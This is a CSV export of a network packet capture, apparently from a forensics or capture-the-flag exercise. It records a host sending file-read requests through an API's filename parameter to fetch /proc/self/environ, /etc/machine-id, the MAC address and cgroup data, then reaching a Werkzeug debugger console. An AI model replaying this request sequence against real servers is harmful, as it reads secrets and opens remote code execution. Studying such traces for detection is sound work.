"No.","Time","Source","Destination","Protocol","Length","Info","src_mac"
"1325","2023-10-21 13:48:24.555579158","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [FIN, ACK] Seq=381 Ack=390 Win=64128 Len=0 TSval=2341540629 TSecr=1741520839","VMware_65:77:ad"
"1382","2023-10-21 13:48:27.293959780","192.168.1.227","192.168.1.1","AJP13","176","AJP13 Error? [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1384","2023-10-21 13:48:27.299447972","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=881 Ack=881 Win=501 Len=0 TSval=2919194068 TSecr=1841285666","VMware_65:77:ad"
"1388","2023-10-21 13:48:27.479367041","192.168.1.227","192.168.1.183","TCP","74","51956  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341543553 TSecr=0 WS=128","VMware_65:77:ad"
"1390","2023-10-21 13:48:27.479960618","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341543554 TSecr=1741523764","VMware_65:77:ad"
"1391","2023-10-21 13:48:27.480134722","192.168.1.227","192.168.1.183","HTTP","577","GET /api?filename=static/images/coffeeshop.jpg HTTP/1.1 ","VMware_65:77:ad"
"1397","2023-10-21 13:48:27.490500675","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=177 Win=64128 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1398","2023-10-21 13:48:27.490500795","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=7417 Win=60032 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1399","2023-10-21 13:48:27.490561211","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=13209 Win=56064 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1402","2023-10-21 13:48:27.491102638","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=27689 Win=46976 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1405","2023-10-21 13:48:27.491355873","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=42169 Win=37248 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1406","2023-10-21 13:48:27.491409295","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=45065 Win=35200 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1408","2023-10-21 13:48:27.491786623","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=66629 Win=25472 Len=0 TSval=2341543566 TSecr=1741523775","VMware_65:77:ad"
"1409","2023-10-21 13:48:27.494231797","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [FIN, ACK] Seq=512 Ack=66629 Win=64128 Len=0 TSval=2341543568 TSecr=1741523775","VMware_65:77:ad"
"1527","2023-10-21 13:48:32.300689853","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=881 Ack=881 Win=501 Len=110 TSval=2919199069 TSecr=1841285666 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1529","2023-10-21 13:48:32.303407358","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=991 Ack=991 Win=501 Len=0 TSval=2919199072 TSecr=1841290670","VMware_65:77:ad"
"1547","2023-10-21 13:48:33.826109131","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1560","2023-10-21 13:48:34.829211471","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1589","2023-10-21 13:48:35.829393017","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1604","2023-10-21 13:48:36.839215669","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1615","2023-10-21 13:48:37.310499394","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=991 Ack=991 Win=501 Len=110 TSval=2919204078 TSecr=1841290670 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1617","2023-10-21 13:48:37.312387300","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1101 Ack=1101 Win=501 Len=0 TSval=2919204081 TSecr=1841295679","VMware_65:77:ad"
"1638","2023-10-21 13:48:38.089777873","192.168.1.227","142.251.10.94","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1639","2023-10-21 13:48:38.089976484","192.168.1.227","192.229.179.87","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1640","2023-10-21 13:48:38.090619675","192.168.1.227","142.251.10.94","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1641","2023-10-21 13:48:38.090766650","192.168.1.227","142.251.10.94","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1647","2023-10-21 13:48:38.093586598","192.168.1.227","74.125.200.95","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1649","2023-10-21 13:48:38.093649208","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=2007 Ack=19495 Win=64128 Len=0 TSval=831673946 TSecr=4285568148","VMware_65:77:ad"
"1650","2023-10-21 13:48:38.093955357","192.168.1.227","74.125.200.95","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1651","2023-10-21 13:48:38.094062282","192.168.1.227","74.125.200.95","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1652","2023-10-21 13:48:38.094557070","192.168.1.227","192.229.179.87","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1653","2023-10-21 13:48:38.094879584","192.168.1.227","192.229.179.87","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1654","2023-10-21 13:48:38.095208634","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [FIN, ACK] Seq=1792 Ack=10309 Win=64128 Len=0 TSval=3909231585 TSecr=1197406931","VMware_65:77:ad"
"1658","2023-10-21 13:48:38.097229906","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1946 Ack=2364 Win=64128 Len=0 TSval=2027215923 TSecr=3154230308","VMware_65:77:ad"
"1752","2023-10-21 13:48:42.318702869","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1101 Ack=1101 Win=501 Len=110 TSval=2919209087 TSecr=1841295679 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1754","2023-10-21 13:48:42.322711256","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1211 Ack=1211 Win=501 Len=0 TSval=2919209091 TSecr=1841300688","VMware_65:77:ad"
"1875","2023-10-21 13:48:46.947330539","192.168.1.227","192.168.1.183","TCP","74","52082  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341563020 TSecr=0 WS=128","VMware_65:77:ad"
"1877","2023-10-21 13:48:46.947968731","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341563021 TSecr=1741543232","VMware_65:77:ad"
"1878","2023-10-21 13:48:46.948404986","192.168.1.227","192.168.1.183","HTTP","530","GET /api?filename=/proc/self/environ HTTP/1.1 ","VMware_65:77:ad"
"1882","2023-10-21 13:48:46.950710816","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=176 Win=64128 Len=0 TSval=2341563024 TSecr=1741543234","VMware_65:77:ad"
"1885","2023-10-21 13:48:46.950858529","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=3072 Win=63488 Len=0 TSval=2341563024 TSecr=1741543235","VMware_65:77:ad"
"1886","2023-10-21 13:48:46.950858599","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=3621 Win=62976 Len=0 TSval=2341563024 TSecr=1741543235","VMware_65:77:ad"
"1887","2023-10-21 13:48:46.951448898","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [FIN, ACK] Seq=465 Ack=3622 Win=64128 Len=0 TSval=2341563025 TSecr=1741543235","VMware_65:77:ad"
"1909","2023-10-21 13:48:47.325221798","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1211 Ack=1211 Win=501 Len=110 TSval=2919214093 TSecr=1841300688 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1911","2023-10-21 13:48:47.339633196","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1321 Ack=1321 Win=501 Len=0 TSval=2919214108 TSecr=1841305705","VMware_65:77:ad"
"1968","2023-10-21 13:48:50.281099679","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"2032","2023-10-21 13:48:52.341809691","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1321 Ack=1321 Win=501 Len=110 TSval=2919219110 TSecr=1841305705 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2034","2023-10-21 13:48:52.359745880","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1431 Ack=1431 Win=501 Len=0 TSval=2919219128 TSecr=1841310726","VMware_65:77:ad"
"2125","2023-10-21 13:48:56.758113327","192.168.1.227","192.168.1.183","TCP","74","45034  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341572831 TSecr=0 WS=128","VMware_65:77:ad"
"2127","2023-10-21 13:48:56.758585625","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341572832 TSecr=1741553043","VMware_65:77:ad"
"2128","2023-10-21 13:48:56.758909301","192.168.1.227","192.168.1.183","HTTP","502","GET /api HTTP/1.1 ","VMware_65:77:ad"
"2132","2023-10-21 13:48:56.800741889","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=196 Win=64128 Len=0 TSval=2341572874 TSecr=1741553084","VMware_65:77:ad"
"2134","2023-10-21 13:48:56.800996262","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=7436 Win=60672 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2136","2023-10-21 13:48:56.801126131","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=13228 Win=61568 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2137","2023-10-21 13:48:56.801203549","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=16683 Win=58624 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2139","2023-10-21 13:48:56.802900261","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [FIN, ACK] Seq=437 Ack=16684 Win=64128 Len=0 TSval=2341572876 TSecr=1741553086","VMware_65:77:ad"
"2143","2023-10-21 13:48:57.366841035","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1431 Ack=1431 Win=501 Len=110 TSval=2919224135 TSecr=1841310726 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2145","2023-10-21 13:48:57.385174325","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1541 Ack=1541 Win=501 Len=0 TSval=2919224153 TSecr=1841315750","VMware_65:77:ad"
"2663","2023-10-21 13:49:02.390333082","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1541 Ack=1541 Win=501 Len=110 TSval=2919229158 TSecr=1841315750 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2665","2023-10-21 13:49:02.396135151","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1651 Ack=1651 Win=501 Len=0 TSval=2919229164 TSecr=1841320762","VMware_65:77:ad"
"2771","2023-10-21 13:49:07.398965538","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1651 Ack=1651 Win=501 Len=110 TSval=2919234167 TSecr=1841320762 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2773","2023-10-21 13:49:07.410973947","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1761 Ack=1761 Win=501 Len=0 TSval=2919234179 TSecr=1841325776","VMware_65:77:ad"
"2802","2023-10-21 13:49:08.632064005","192.168.1.227","192.168.1.183","TCP","74","59330  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341584705 TSecr=0 WS=128","VMware_65:77:ad"
"2804","2023-10-21 13:49:08.632791749","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341584706 TSecr=1741564917","VMware_65:77:ad"
"2805","2023-10-21 13:49:08.632974088","192.168.1.227","192.168.1.183","HTTP","525","GET /api?filename=/proc/net/arp HTTP/1.1 ","VMware_65:77:ad"
"2809","2023-10-21 13:49:08.635048071","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [ACK] Seq=460 Ack=175 Win=64128 Len=0 TSval=2341584708 TSecr=1741564919","VMware_65:77:ad"
"2810","2023-10-21 13:49:08.635718503","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [FIN, ACK] Seq=460 Ack=399 Win=64128 Len=0 TSval=2341584709 TSecr=1741564919","VMware_65:77:ad"
"2884","2023-10-21 13:49:12.414484220","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1761 Ack=1761 Win=501 Len=110 TSval=2919239183 TSecr=1841325776 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2886","2023-10-21 13:49:12.430167681","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1871 Ack=1871 Win=501 Len=0 TSval=2919239198 TSecr=1841330796","VMware_65:77:ad"
"2980","2023-10-21 13:49:17.438000256","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1871 Ack=1871 Win=501 Len=110 TSval=2919244206 TSecr=1841330796 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2984","2023-10-21 13:49:17.447518843","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1981 Ack=1981 Win=501 Len=0 TSval=2919244216 TSecr=1841335813","VMware_65:77:ad"
"2994","2023-10-21 13:49:18.455918121","192.168.1.227","192.168.1.183","TCP","74","57994  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341594529 TSecr=0 WS=128","VMware_65:77:ad"
"2996","2023-10-21 13:49:18.456348636","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341594530 TSecr=1741574740","VMware_65:77:ad"
"2997","2023-10-21 13:49:18.456557035","192.168.1.227","192.168.1.183","HTTP","539","GET /api?filename=/sys/class/net/eth0/address HTTP/1.1 ","VMware_65:77:ad"
"3001","2023-10-21 13:49:18.458917348","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [ACK] Seq=474 Ack=174 Win=64128 Len=0 TSval=2341594532 TSecr=1741574743","VMware_65:77:ad"
"3002","2023-10-21 13:49:18.459246133","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [FIN, ACK] Seq=474 Ack=260 Win=64128 Len=0 TSval=2341594532 TSecr=1741574743","VMware_65:77:ad"
"3072","2023-10-21 13:49:22.454019987","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1981 Ack=1981 Win=501 Len=110 TSval=2919249222 TSecr=1841335813 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3075","2023-10-21 13:49:22.464477576","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2091 Ack=2091 Win=501 Len=0 TSval=2919249233 TSecr=1841340830","VMware_65:77:ad"
"3076","2023-10-21 13:49:22.475188293","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"3388","2023-10-21 13:49:27.470807887","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2091 Ack=2091 Win=501 Len=110 TSval=2919254238 TSecr=1841340830 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3393","2023-10-21 13:49:27.486158073","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2201 Ack=2201 Win=501 Len=0 TSval=2919254254 TSecr=1841345847","VMware_65:77:ad"
"3457","2023-10-21 13:49:30.650218165","192.168.1.227","192.168.1.183","TCP","74","46042  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341606723 TSecr=0 WS=128","VMware_65:77:ad"
"3459","2023-10-21 13:49:30.650817984","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341606724 TSecr=1741586935","VMware_65:77:ad"
"3460","2023-10-21 13:49:30.651053765","192.168.1.227","192.168.1.183","HTTP","527","GET /api?filename=/etc/machine-id HTTP/1.1 ","VMware_65:77:ad"
"3463","2023-10-21 13:49:30.652846789","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=462 Ack=175 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3466","2023-10-21 13:49:30.653035941","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=462 Ack=275 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3467","2023-10-21 13:49:30.653643044","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [FIN, ACK] Seq=462 Ack=276 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3512","2023-10-21 13:49:32.495577156","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2201 Ack=2201 Win=501 Len=110 TSval=2919259263 TSecr=1841345847 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3515","2023-10-21 13:49:32.501283198","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2311 Ack=2311 Win=501 Len=0 TSval=2919259269 TSecr=1841350866","VMware_65:77:ad"
"3595","2023-10-21 13:49:37.510114545","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2311 Ack=2311 Win=501 Len=110 TSval=2919264278 TSecr=1841350866 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3598","2023-10-21 13:49:37.521373225","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2421 Ack=2421 Win=501 Len=0 TSval=2919264289 TSecr=1841355886","VMware_65:77:ad"
"3645","2023-10-21 13:49:40.667843020","192.168.1.227","192.168.1.183","TCP","74","43138  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341616740 TSecr=0 WS=128","VMware_65:77:ad"
"3647","2023-10-21 13:49:40.668517021","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341616741 TSecr=1741596952","VMware_65:77:ad"
"3648","2023-10-21 13:49:40.668751911","192.168.1.227","192.168.1.183","HTTP","529","GET /api?filename=/proc/self/cgroup HTTP/1.1 ","VMware_65:77:ad"
"3652","2023-10-21 13:49:40.671251535","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [ACK] Seq=464 Ack=175 Win=64128 Len=0 TSval=2341616744 TSecr=1741596955","VMware_65:77:ad"
"3653","2023-10-21 13:49:40.671682671","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [FIN, ACK] Seq=464 Ack=290 Win=64128 Len=0 TSval=2341616744 TSecr=1741596955","VMware_65:77:ad"
"3711","2023-10-21 13:49:42.525862947","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2421 Ack=2421 Win=501 Len=110 TSval=2919269293 TSecr=1841355886 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3714","2023-10-21 13:49:42.535635375","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2531 Ack=2531 Win=501 Len=0 TSval=2919269303 TSecr=1841360900","VMware_65:77:ad"
"3807","2023-10-21 13:49:47.542305171","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2531 Ack=2531 Win=501 Len=110 TSval=2919274310 TSecr=1841360900 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3810","2023-10-21 13:49:47.553672185","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2641 Ack=2641 Win=501 Len=0 TSval=2919274321 TSecr=1841365918","VMware_65:77:ad"
"3835","2023-10-21 13:49:49.365015358","192.168.1.227","192.168.1.183","TCP","74","37082  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341625436 TSecr=0 WS=128","VMware_65:77:ad"
"3837","2023-10-21 13:49:49.365616536","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341625438 TSecr=1741605649","VMware_65:77:ad"
"3838","2023-10-21 13:49:49.366027554","192.168.1.227","192.168.1.183","HTTP","558","GET /console HTTP/1.1 ","VMware_65:77:ad"
"3842","2023-10-21 13:49:49.368970874","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=176 Win=64128 Len=0 TSval=2341625441 TSecr=1741605653","VMware_65:77:ad"
"3843","2023-10-21 13:49:49.369031600","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=1624 Win=64128 Len=0 TSval=2341625442 TSecr=1741605653","VMware_65:77:ad"
"3846","2023-10-21 13:49:49.369274104","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=1739 Win=64128 Len=0 TSval=2341625442 TSecr=1741605653","VMware_65:77:ad"
"3847","2023-10-21 13:49:49.370202923","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [FIN, ACK] Seq=493 Ack=1740 Win=64128 Len=0 TSval=2341625443 TSecr=1741605653","VMware_65:77:ad"
"3850","2023-10-21 13:49:50.147685285","192.168.1.227","192.168.1.183","TCP","74","37086  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626220 TSecr=0 WS=128","VMware_65:77:ad"
"3852","2023-10-21 13:49:50.148068339","192.168.1.227","192.168.1.183","TCP","74","37088  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626220 TSecr=0 WS=128","VMware_65:77:ad"
"3854","2023-10-21 13:49:50.148468846","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626221 TSecr=1741606432","VMware_65:77:ad"
"3855","2023-10-21 13:49:50.148468936","192.168.1.227","192.168.1.183","HTTP","497","GET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1 ","VMware_65:77:ad"
"3857","2023-10-21 13:49:50.148468966","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626221 TSecr=1741606432","VMware_65:77:ad"
"3858","2023-10-21 13:49:50.148701772","192.168.1.227","192.168.1.183","HTTP","484","GET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1 ","VMware_65:77:ad"
"3861","2023-10-21 13:49:50.153765390","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=432 Ack=305 Win=64128 Len=0 TSval=2341626226 TSecr=1741606437","VMware_65:77:ad"
"3864","2023-10-21 13:49:50.154151941","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=316 Win=64128 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3869","2023-10-21 13:49:50.154651287","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=432 Ack=6383 Win=60672 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3870","2023-10-21 13:49:50.154651387","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=7556 Win=60672 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3871","2023-10-21 13:49:50.154712294","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=8508 Win=59776 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3872","2023-10-21 13:49:50.154857712","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [FIN, ACK] Seq=432 Ack=6384 Win=64128 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3874","2023-10-21 13:49:50.155135665","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=10838 Win=57472 Len=0 TSval=2341626227 TSecr=1741606439","VMware_65:77:ad"
"3875","2023-10-21 13:49:50.156129709","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [FIN, ACK] Seq=419 Ack=10838 Win=64128 Len=0 TSval=2341626229 TSecr=1741606439","VMware_65:77:ad"
"3887","2023-10-21 13:49:50.260224055","192.168.1.227","192.168.1.183","TCP","74","37106  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626332 TSecr=0 WS=128","VMware_65:77:ad"
"3889","2023-10-21 13:49:50.260586239","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626333 TSecr=1741606544","VMware_65:77:ad"
"3890","2023-10-21 13:49:50.260794458","192.168.1.227","192.168.1.183","HTTP","493","GET /console?__debugger__=yes&cmd=printpin&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"3894","2023-10-21 13:49:50.263342886","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [ACK] Seq=428 Ack=174 Win=64128 Len=0 TSval=2341626336 TSecr=1741606547","VMware_65:77:ad"
"3895","2023-10-21 13:49:50.263904691","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [FIN, ACK] Seq=428 Ack=175 Win=64128 Len=0 TSval=2341626336 TSecr=1741606547","VMware_65:77:ad"
"3897","2023-10-21 13:49:50.280808253","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"3917","2023-10-21 13:49:52.558673537","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2641 Ack=2641 Win=501 Len=110 TSval=2919279326 TSecr=1841365918 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3920","2023-10-21 13:49:52.568314903","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2751 Ack=2751 Win=501 Len=0 TSval=2919279336 TSecr=1841370933","VMware_65:77:ad"
"3952","2023-10-21 13:49:54.515275893","192.168.1.227","192.168.1.183","TCP","74","37112  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341630587 TSecr=0 WS=128","VMware_65:77:ad"
